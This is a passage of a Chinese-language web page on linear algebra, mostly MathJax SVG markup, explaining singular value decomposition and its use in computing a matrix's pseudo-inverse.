data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="mrow" transform="translate(358.7, -345.6) scale(0.707)"><g data-mml-node="mi"><path data-c="1D715" d="M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z"></path></g><g data-mml-node="mi" transform="translate(566, 0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><rect width="1282.1" height="60" x="120" y="220"></rect></g></g></g></g><g data-mml-node="mo" transform="translate(2189.1, 0)"><path data-c="23A4" d="M0 1070V1154H347V-645H263V1070H0Z" transform="translate(0, 2223.5)"></path><path data-c="23A6" d="M263 -560V1155H347V-644H0V-560H263Z" transform="translate(0, -2233.5)"></path><svg width="667" height="2857" y="-1178.5" x="0" viewBox="0 714.3 667 2857"><path data-c="23A5" d="M263 0V602H347V0H263Z" transform="scale(1, 7.119)"></path></svg></g></g></g></g></svg></mjx-container></span></p>
<h3 id="奇异值分解singular-value-decomposition">奇异值分解（singular value decomposition）</h3>
<p><span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="5.481ex" height="1.136ex" role="img" focusable="false" viewBox="0 -491 2422.4 502"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(822.2, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1822.4, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container></span>方阵可以分解为<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="12.788ex" height="2.179ex" role="img" focusable="false" viewBox="0 -881 5652.2 963"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mpadded"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g><g data-mml-node="mspace"></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(55.3, 0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g><g data-mml-node="mo" transform="translate(1083, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2138.8, 0)"><g data-mml-node="mpadded"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g></g></g><g data-mml-node="mspace" transform="translate(2138.8, 0)"></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2194.1, 0)"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g></g><g data-mml-node="mi" transform="translate(3046.1, 0)"><path data-c="39B" d="M320 708Q326 716 340 716H348H355Q367 716 372 708Q374 706 423 547T523 226T575 62Q581 52 591 50T634 46H661V0H653Q644 3 532 3Q411 3 390 0H379V46H392Q464 46 464 65Q463 70 390 305T316 539L246 316Q177 95 177 84Q177 72 198 59T248 46H253V0H245Q230 3 130 3Q47 3 38 0H32V46H45Q112 51 127 91Q128 92 224 399T320 708Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(3740.1, 0)"><g data-mml-node="mpadded"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g></g></g><g data-mml-node="mspace" transform="translate(3740.1, 0)"></g><g data-mml-node="msup" transform="translate(3795.3, 0)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g></g><g data-mml-node="TeXAtom" transform="translate(903.2, 410.1) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></g></svg></mjx-container></span> ， 类似的<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="5.481ex" height="1.077ex" role="img" focusable="false" viewBox="0 -465 2422.4 476"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(822.2, 0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mi" transform="translate(1544.4, 0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container></span>矩阵也能分解<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="12.854ex" height="2.179ex" role="img" focusable="false" viewBox="0 -881 5681.5 963"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mpadded"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g><g data-mml-node="mspace"></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(55.3, 0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g><g data-mml-node="mo" transform="translate(1083, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2138.8, 0)"><g data-mml-node="mpadded"><g data-mml-node="mi"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g></g></g><g data-mml-node="mspace" transform="translate(2138.8, 0)"></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2194.1, 0)"><g data-mml-node="mi"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2961.1, 0)"><g data-mml-node="mpadded"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g></g></g><g data-mml-node="mspace" transform="translate(2961.1, 0)"></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(3016.3, 0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(3844.3, 0)"><g data-mml-node="mpadded"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g></g></g><g data-mml-node="mspace" transform="translate(3844.3, 0)"></g><g data-mml-node="msup" transform="translate(3899.6, 0)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g></g><g data-mml-node="TeXAtom" transform="translate(828.3, 410.1) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></g></svg></mjx-container></span></p>
<p>D为<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="5.481ex" height="1.077ex" role="img" focusable="false" viewBox="0 -465 2422.4 476"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1100.2, 0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mi" transform="translate(1822.4, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container></span>对角矩阵，对角线元素为矩阵 A 的奇异值。U、V都是正交矩阵，因此可以用SVD可以用于求解矩阵的伪逆：</p>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="14.14ex" height="2.203ex" role="img" focusable="false" viewBox="0 -891.7 6249.8 973.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(750, 413) scale(0.707)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g></g><g data-mml-node="mo" transform="translate(1627.9, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2683.7, 0)"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 